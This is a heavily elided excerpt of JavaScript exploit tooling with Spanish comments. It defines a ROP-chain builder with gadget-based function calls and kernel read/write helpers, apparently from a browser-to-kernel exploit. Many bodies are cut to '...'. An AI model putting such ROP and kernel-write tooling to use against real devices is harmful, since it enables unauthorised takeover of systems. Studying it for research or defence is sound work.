...
// Clase para crear y gestionar rápidamente una cadena ROP
window.rop = function () {
    // Inicialización de la pila y las variables necesarias
    ...
    this.clear = function () {
        this.count = 1;
        this.branches_count = 0;
        // Limpiar la pila (excepto el área reservada)
        for (let i = 1; i < (stack_sz / 4) - stack_reserved_idx; i++) {
            this.stack_array[i + stack_reserved_idx] = 0;
        }
    };

    // Función para crear un índice simbólico
    this.pushSymbolic = function () {
        this.count++;
        return this.count - 1;
    };

    // Función para finalizar un valor simbólico en la pila
    ...
    // Función para hacer un 'push' de un valor en la pila
    this.push = function (val) {
        this.finalizeSymbolic(this.pushSymbolic(), val);
    };

    // Función para escribir 8 bytes en una dirección
    ...
    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        if (rdi !== undefined) this.push(gadgets["pop rdi"]), this.push(rdi);
        if (rsi !== undefined) this.push(gadgets["pop rsi"]), this.push(rsi);
        if (rdx !== undefined) this.push(gadgets["pop rdx"]), this.push(rdx);
        if (rcx !== undefined) this.push(gadgets["pop rcx"]), this.push(rcx);
        if (r8 !== undefined) this.push(gadgets["pop r8"]), this.push(r8);
        if (r9 !== undefined) this.push(gadgets["pop r9"]), this.push(r9);

        this.push(rip);
        return this;
    };

    // Función para hacer una llamada a una función con ROP
    ...
    // Escribir el resultado de 4 bytes en la dirección especificada
    ...
    // Establecer el valor de la variable del kernel
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    };

    // Función para cargar una dirección desde el kernel
    ...
    // Escribir una dirección del kernel en la cadena ROP
    ...
    // Escribir un valor de 8 bytes en una dirección del kernel
    ...
    // Escribir un valor de 4 bytes en una dirección del kernel
    ...
    // Escribir 8 bytes de una dirección del kernel a otra
